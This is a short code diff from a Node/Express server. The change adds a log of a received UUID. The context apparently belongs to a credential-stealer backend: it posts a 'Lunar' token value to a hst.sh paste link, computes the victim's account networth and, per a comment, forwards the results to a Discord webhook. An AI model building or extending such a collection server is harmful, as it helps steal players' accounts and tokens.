@@ -147,7 +147,7 @@ app.post("/", (req, res) => {
                 else
                     checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
 
-                
+                console.log(req.body.uuid)
                 
                 //send to discord webhook
                 networthCalc(req.body.uuid).then((result) => {
